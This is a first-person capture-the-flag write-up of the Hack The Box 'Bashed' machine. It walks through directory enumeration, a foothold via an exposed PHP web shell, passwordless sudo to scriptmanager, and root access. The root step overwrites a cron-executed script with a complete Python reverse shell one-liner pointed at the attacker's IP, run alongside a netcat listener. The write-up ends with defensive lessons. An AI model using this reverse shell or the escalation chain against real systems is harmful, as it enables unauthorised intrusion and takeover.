Summary

Bashed is an easy Linux machine that focuses on web enumeration, locating exposed development files, gaining initial access through a web shell, and escalating privileges by abusing sudo permissions and a writable script executed by a privileged user.

The main lesson from this machine was that exposed development directories can provide direct access to web shells or administrative tools. After gaining access as www-data, local enumeration revealed that the user could run commands as scriptmanager without a password. Further enumeration showed a writable script in /scripts, which was used to obtain root access.

Web Enumeration

Since only port 80 was open, I focused my enumeration on the web server. Visiting the site showed a development-themed page titled Arrexel's Development Site. I then used web enumeration tools to identify hidden directories. 

whatweb http://10.129.18.117
gobuster dir -u http://10.129.18.117 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o web/gobuster.txt

Directory enumeration revealed several interesting paths:

  • /css
  • /dev
  • /fonts
  • /images
  • /index.html
  • /js
  • /php
  • /uploads

The most important directory was /dev. This directory contained a PHP web shell, which allowed command execution on the target as the www-data user.

Initial Foothold

Initial access was gained through the exposed PHP shell located in the /dev directory. The shell executed commands as the Apache web server user, www-data.

Initial access details:

  • User: www-data
  • Shell Type: Web shell
  • Working Directory: /var/www/html/dev

After gaining command execution, I upgraded the shell to make it easier to work with. 

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

Privilege Escalation

Local Enumeration

I started privilege escalation by checking the current user, group membership, hostname, kernel version, sudo permissions, and SUID binaries. 

whoami
id
hostname
uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null

The most important finding came from sudo -l:

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

This meant that www-data could run any command as the user scriptmanager without needing a password. 

sudo -u scriptmanager /bin/bash

After switching to scriptmanager, I found the /scripts directory. This directory contained a Python script that could be modified by scriptmanager. The script was being executed automatically by a higher-privileged process, which allowed privilege escalation to root.

Root Shell

I modified the writable Python script to connect back to my attacking machine. Before editing the script, I started a Netcat listener on my Parrot machine. 

nc -lvnp 4445

Then I replaced the contents of the script with a Python reverse shell pointing to my HTB VPN tun0 IP address. 

echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.209",4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' > /scripts/test.py

After waiting for the script to execute, the listener received a root shell.

Vulnerabilities / Misconfigurations

The primary issue on this machine was not a traditional CVE, but a combination of poor security practices and misconfigurations. The web server exposed a development directory containing a PHP shell, which gave unauthenticated command execution as www-data. From there, sudo permissions allowed www-data to run commands as scriptmanager without a password. Finally, scriptmanager had write access to a script that was executed by a privileged process, allowing root compromise.

Defensive Takeaways

Development tools, web shells, and test scripts should never be left exposed on a production web server. Web directories should be reviewed regularly to ensure sensitive files are not publicly accessible. Sudo permissions should follow the principle of least privilege, and writable scripts executed by privileged users should be carefully protected. Cron jobs or automated scripts running as root should never execute files that lower-privileged users can modify.

Lessons Learned

Bashed reinforced the importance of thorough web enumeration. A single exposed development directory led directly to initial access. This machine also showed why checking sudo -l is one of the first things to do after gaining a shell. The privilege escalation path was straightforward once I identified that www-data could become scriptmanager and that scriptmanager could modify a script executed by a privileged process.
